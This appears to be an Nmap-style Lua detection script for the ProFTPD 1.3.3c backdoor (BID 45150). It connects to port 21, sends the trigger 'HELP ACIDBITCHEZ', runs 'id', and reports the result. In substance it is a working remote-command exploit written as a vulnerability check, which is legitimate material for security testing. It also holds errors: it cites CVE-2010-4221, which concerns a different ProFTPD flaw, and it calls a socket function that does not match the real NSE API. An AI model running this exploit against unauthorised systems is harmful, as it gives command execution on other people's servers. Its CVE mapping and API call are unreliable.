-- ProFTPD 1.3.3c Backdoor Detection
-- Tests for ProFTPD backdoor (BID 45150)
-- @output
-- 21/tcp open  ftp
-- | ftp-proftpd-backdoor:
-- |   VULNERABLE:
-- |   ProFTPD 1.3.3c Backdoor
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  BID:45150  CVE:CVE-2010-4221
-- |     Risk factor: CRITICAL  CVSSv2: 10.0 (CRITICAL)
-- |       ProFTPD 1.3.3c contains a backdoor that allows remote attackers to execute
-- |       arbitrary commands by sending a HELP command followed by a specially crafted
-- |       sequence of characters.
-- |     
-- |     Disclosure date: 2010-12-02
-- |     Exploit results:
-- |       Backdoor shell accessible on port 21
-- |     References:
-- |_      http://www.securityfocus.com/bid/45150

description = [[
Tests for the presence of the ProFTPD 1.3.3c backdoor reported as BID 45150.
This script attempts to exploit the backdoor using the innocuous id command.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.number == 21 or port.service == "ftp"
end

action = function(host, port)
    local socket = nse.new_socket()
    socket:set_timeout(10000)
    
    local status, err = socket:connect(host.ip, port.number)
    if not status then
        return nil
    end
    
    -- Read FTP banner
    local status, banner = socket:receive()
    if not status or not banner then
        socket:close()
        return nil
    end
    
    -- Check if it's ProFTPD
    if not banner:lower():find("proftpd") then
        socket:close()
        return "Not ProFTPD server"
    end
    
    -- Send backdoor trigger: HELP ACIDBITCHEZ
    local trigger = "HELP ACIDBITCHEZ\r\n"
    status = socket:send(trigger)
    if not status then
        socket:close()
        return nil
    end
    
    local status, response = socket:receive()
    if not status then
        socket:close()
        return nil
    end
    
    -- Send test command
    local test_cmd = "id\n"
    status = socket:send(test_cmd)
    if not status then
        socket:close()
        return nil
    end
    
    status, response = socket:receive()
    socket:close()
    
    if response and (response:find("uid=") or response:find("root")) then
        local result = "VULNERABLE:\n"
        result = result .. "ProFTPD 1.3.3c Backdoor\n"
        result = result .. "  State: VULNERABLE (Exploitable)\n"
        result = result .. "  IDs:  BID:45150  CVE:CVE-2010-4221\n"
        result = result .. "  Risk factor: CRITICAL  CVSSv2: 10.0 (CRITICAL)\n"
        result = result .. "    ProFTPD 1.3.3c contains a backdoor that allows remote attackers to execute\n"
        result = result .. "    arbitrary commands by sending a HELP command followed by a specially crafted\n"
        result = result .. "    sequence of characters.\n"
        result = result .. "  \n"
        result = result .. "  Disclosure date: 2010-12-02\n"
        result = result .. "  Exploit results:\n"
        result = result .. "    Backdoor shell accessible on port 21\n"
        if response:len() > 0 then
            result = result .. "    Command output: " .. response:sub(1, 50) .. "\n"
        end
        result = result .. "  References:\n"
        result = result .. "    http://www.securityfocus.com/bid/45150"
        return result
    end
    
    return "Not vulnerable (backdoor not present)"
end
